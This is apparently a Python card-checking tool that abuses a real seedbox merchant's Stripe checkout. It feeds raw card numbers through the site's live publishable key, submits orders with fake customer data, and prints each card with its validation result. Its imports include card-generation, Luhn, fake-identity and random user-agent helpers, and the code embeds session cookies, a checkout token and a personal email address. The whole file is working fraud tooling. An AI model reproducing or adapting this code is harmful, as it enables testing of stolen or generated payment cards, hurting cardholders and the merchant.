from app.core.reqPlus import reqPlus

from app.utils.exceptions import(
    expInvalidRequest,
    expInvalidRequestsResponse,
    invalidCredentials,
    userNotFound,
    captchaWrong,
    expMaxRetries,
    expSpecialTimeOut
)

import urllib

from app.utils.cchelper import(
    formatar_cc,
    fmt_cc,
    luhn,
    gen_gg
)

from app.utils.utils import(
    add_arquivo,
    gibe_random_ua,
    b64decfixpad
)



import json

from app.utils.fakeUSAperson import FakePesonCheckoutAluvii


class stripeEVOSEEDBOX(reqPlus):
    def __init__(
        self,
        proxies={},
        timeout=(10,30)
    ):
        self.client_data = None
        self.client_mail = 'juliettedrunk@fthcapital.com'
        super().__init__(proxies=proxies, timeout=timeout, default_useragent=gibe_random_ua())
    def gen_client(self):
        fake = FakePesonCheckoutAluvii()
        self.client_data = fake
    def gen_stripe_token(self, cc_raw):
        self._requests = {}
        cc_data = formatar_cc(cc_raw)
        if not cc_data:
            print(f'failed formatar cc')
            return False
        self.new_session(ua=gibe_random_ua())
        self.gen_client()
        url = 'https://api.stripe.com/v1/payment_methods'
        headers = self.gen_headers(
            referer='https://js.stripe.com/',
            origin='https://js.stripe.com',
            **{
                'Content-Type': 'application/x-www-form-urlencoded'
            }
        )
        payload = {
            "type": "card",
            "card[number]": cc_data.get('cc'),
            "card[cvc]": cc_data.get('cvv'),
            "card[exp_month]": cc_data.get('month'),
            "card[exp_year]": cc_data.get('year'),
            "guid": "ad57307d-e85a-419f-b6ed-3264541ea91eec719f",
            "muid": "a7c912c2-10b8-425c-97e5-3d41b1652ff3af213d",
            "sid": "e5fb3457-6b6d-47af-8e00-828eaa6260563ffba2",
            "pasted_fields": "number",
            "payment_user_agent": "stripe.js/bf317941e9; stripe-js-v3/bf317941e9; split-card-element",
            "referrer": "https://client.evoseedbox.com",
            "time_on_page": "39552",
            "key": "pk_live_51L3gLASAxW5hYEWxJHMQEwnbAPLC1mjEcjqVmQlMPpJMtIqKGbLKS4EN1fC7xMQyrSyNj8ARmueJjmRXFA1LLf1K00rf1t32pE",
            "radar_options": {}
        }
        try:
            response = self._make_call(
                url=url,
                headers=headers,
                data=payload,
                method='POST'
            )
        except Exception as err:
            print(f'gen_stripe_token exp --- {err}')
        else:
            if response.status_code == 200:
                payment_id = response.json().get('id', False)
                country_payment = response.json().get("card", {}).get("country", False)
                if payment_id:
                    country_payment = country_payment if country_payment else 'US'
                    response.set_status(True)
                    response.add_extra(
                        {
                            'payment_id': payment_id,
                            'cc_data': cc_data,
                            'country_payment': country_payment
                        }
                    )
                    return True
                else:
                    print(f'stripeEVOSEEDBOX.gen_stripe_token no payment_id')
            else:
                print(f'stripeEVOSEEDBOX.gen_stripe_token status_code != 200 --- {response.status_code}')
        return False
    def make_payment(self):
        response_gen_token = self.get_request('gen_stripe_token', True)
        if not response_gen_token:
            return False
        extra_data = response_gen_token.get_extra()
        payment_id = extra_data.get('payment_id', False)
        country_payment = extra_data.get('country_payment', False)
        cc_data = extra_data.get('cc_data', False)
        if not payment_id or not cc_data or not country_payment:
            return False
        url = 'https://client.evoseedbox.com/index.php?rp=/stripe/payment/intent'
        headers = self.gen_headers(
            referer='https://client.evoseedbox.com/cart.php?a=checkout',
            origin='https://client.evoseedbox.com',
            **{
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-Requested-With': 'XMLHttpRequest',
                'Cookie': 'psuid=c41e6505-1113-4d3c-ab0b-fb390c23d313; ps5bc0667b3bb5d56cc2f1dd17=true|1715472000000; ps-goals=%7B%225f0426d761588d7f058dea84%22%3A%7B%22expires%22%3A1717635640533%2C%22view%22%3Atrue%2C%22click%22%3Afalse%2C%22hover%22%3Afalse%7D%2C%225f06283b90f9e04eb09c26bc%22%3A%7B%22expires%22%3A1717635653543%2C%22view%22%3Atrue%2C%22click%22%3Afalse%2C%22hover%22%3Afalse%7D%2C%225f0424a60f45bd7f1511de89%22%3A%7B%22expires%22%3A1717635666550%2C%22view%22%3Atrue%2C%22click%22%3Afalse%2C%22hover%22%3Afalse%7D%7D; WHMCS7rTZ76rmxmiJ=ah7m890pmfrt6ope63604pdiur; __stripe_mid=b0fe6a18-eefc-4b05-bf9f-e734e8702044617c24; __stripe_sid=cc0eccea-7f61-491d-8eb8-cbbb7bf0d059831cb8',
            }
        )
        payload = {
            'token': '0ccf02656f63a786a03980d037b9599ca4ad4e25',
            'submit': 'true',
            'loginemail': '',
            'loginpassword': '',
            'custtype': 'new',
            'firstname': 'full',
            'lastname': 'name',
            'email': 'luis.car.los77mg@gmail.com',
            'country-calling-code-phonenumber': '1',
            'phonenumber': '201-555-9999',
            'companyname': '',
            'address1': 'uahauahuau',
            'address2': '',
            'city': 'uauahuauha',
            #'country': country_payment,
            'country': 'US',
            'state': 'Alaska',
            'postcode': '10010',
            'password': 'B@nanabanana1',
            'password2': 'B@nanabanana1',
            'applycredit': '1',
            'paymentmethod': 'stripe',
            'ccinfo': 'new',
            'ccdescription': '',
            'notes': '',
            'payment_method_id': payment_id,
        }
        try:
            response = self._make_call(
                url=url,
                headers=headers,
                data=payload,
                method='POST'
            )
        except Exception as err:
            print(f'make_payment exp --- {err}')
        else:
            if response.status_code == 200:
                status_card = response.json().get('validation_feedback', False)
                if status_card:
                    cc_frmt = f'{cc_data.get("cc")}|{cc_data.get("month")}|{cc_data.get("year")}|{cc_data.get("cvv")} '
                    print(f'{cc_frmt} - {status_card}')
                    response.set_status(True)
                    response.add_extra(
                        {
                            'status': status_card,
                            'cc_data': cc_data,
                            'cc_frmt': cc_frmt
                        }
                    )
                    return True
                else:
                    print(f'stripeEVOSEEDBOX.make_payment no status card')
            else:
                print(f'stripeEVOSEEDBOX.make_payment status_code != 200 --- {response.status_code}')
        return False
    def check(self, cc_raw):
        if self.gen_stripe_token(cc_raw) is True:
            return self.make_payment()
        return False
